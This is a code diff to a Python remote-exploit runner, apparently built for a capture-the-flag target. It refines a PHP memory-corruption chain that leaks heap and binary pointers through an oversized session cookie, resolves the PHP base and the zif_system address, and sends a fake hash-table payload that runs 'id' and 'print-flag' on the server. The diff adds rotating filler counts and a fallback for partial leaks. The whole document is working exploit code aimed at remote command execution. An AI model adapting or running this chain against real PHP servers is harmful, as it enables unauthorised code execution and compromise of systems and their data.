@@ -26,7 +26,7 @@ class RemoteProofConfig:
     retry_delay: float
     leak_length: int
     pre_parameters: int
-    b1_fillers: int
+    b1_fillers: tuple[int, ...]
     worker_stride: int
     use_proxy: bool
     pipelined: bool
@@ -48,6 +48,7 @@ class RemoteProofRunner:
         self.config = config
         self.payloads = PayloadSet.create()
         self.transcript: list[str] = []
+        self.php_base: int | None = None
 
     def run(self) -> None:
         self.config.proof_log.unlink(missing_ok=True)
@@ -64,7 +65,8 @@ class RemoteProofRunner:
             try:
                 proof = self.run_attempt(attempt)
             except (ConnectionError, OSError, RuntimeError, http.client.HTTPException) as error:
-                print(f"attempt={attempt} failed: {error}", flush=True)
+                fillers = self.config.b1_fillers[(attempt - 1) % len(self.config.b1_fillers)]
+                print(f"attempt={attempt} b1_fillers={fillers} failed: {error}", flush=True)
                 time.sleep(self.config.retry_delay)
                 continue
             self.complete(proof)
@@ -75,8 +77,9 @@ class RemoteProofRunner:
         nonce = secrets.token_hex(8)
         command = f"echo {nonce};id;echo {nonce}-flag;print-flag&&echo {nonce}-end".encode()
         query = "&".join(f"q{index:04d}=v" for index in range(self.config.pre_parameters))
+        fillers = self.config.b1_fillers[(attempt - 1) % len(self.config.b1_fillers)]
         a1_path = self.config.endpoint + "?" + query
-        b1_path = self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length, self.config.b1_fillers)
+        b1_path = self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length, fillers)
         with PersistentHttpClient(self.config.target, self.config.timeout, self.config.use_proxy) as client:
             leak_stages = (
                 HttpRequest.post(self.config.endpoint, self.payloads.seed, exploit.BOUNDARY),
@@ -94,7 +97,14 @@ class RemoteProofRunner:
                 raise RemoteProofError(f"B1 returned a {len(cookie)}-byte session cookie")
             self.config.leak_file.write_bytes(cookie)
             self.config.leak_file.chmod(0o600)
-            leak = exploit.parse_leaked_cookie(cookie, self.config.profile)
+            heaps, pies = exploit.collect_pointer_candidates(cookie)
+            main_chunk = exploit.resolve_main_chunk(heaps)
+            try:
+                self.php_base = exploit.resolve_php_base(pies, self.config.profile)
+            except RuntimeError:
+                if self.php_base is None:
+                    raise RemoteProofError(f"partial leak has heap {main_chunk:#x} but no PHP anchor") from None
+            leak = exploit.AddressLeak(main_chunk, self.php_base, self.config.profile.zif_system_offset)
             b2_body = exploit.build_b2(leak.fake_hash_table, leak.zif_system, command)
             ensure_request_size("B2", b2_body)
             callback_stages = (
@@ -165,6 +175,12 @@ def validate_callback(response: HttpResponse, nonce: str) -> bytes:
 def integer(value: str) -> int:
     return int(value, 0)
 
+def integer_list(value: str) -> tuple[int, ...]:
+    values = tuple(integer(part.strip()) for part in value.split(",") if part.strip())
+    if not values:
+        raise ValueError("integer list cannot be empty")
+    return values
+
 def parse_config() -> RemoteProofConfig:
     parser = argparse.ArgumentParser()
     parser.add_argument("--target", default="https://old.stealmybitcoin.com")
@@ -177,14 +193,14 @@ def parse_config() -> RemoteProofConfig:
     parser.add_argument("--retry-delay", type=float, default=0.5)
     parser.add_argument("--leak-length", type=integer, default=0x440)
     parser.add_argument("--pre-parameters", type=int, default=8)
-    parser.add_argument("--b1-fillers", type=int, default=5)
+    parser.add_argument("--b1-fillers", type=integer_list, default=(5, 6, 2, 7))
     parser.add_argument("--worker-stride", type=int, default=1)
     parser.add_argument("--direct", action="store_true")
     parser.add_argument("--sequential", action="store_true")
     parser.add_argument("--proof-log", type=Path, default=Path(__file__).resolve().with_name("remote-proof.log"))
     parser.add_argument("--leak-file", type=Path, default=Path(__file__).resolve().with_name("remote-leak.bin"))
     arguments = parser.parse_args()
-    if arguments.attempts < 1 or arguments.pre_parameters < 0 or arguments.b1_fillers < 0 or arguments.worker_stride < 1 or arguments.timeout <= 0 or arguments.retry_delay < 0:
+    if arguments.attempts < 1 or arguments.pre_parameters < 0 or any(value < 0 for value in arguments.b1_fillers) or arguments.worker_stride < 1 or arguments.timeout <= 0 or arguments.retry_delay < 0:
         parser.error("attempts, timeout, retry delay, and pre-parameter count must be valid")
     return RemoteProofConfig(
         HttpTarget.parse(arguments.target),
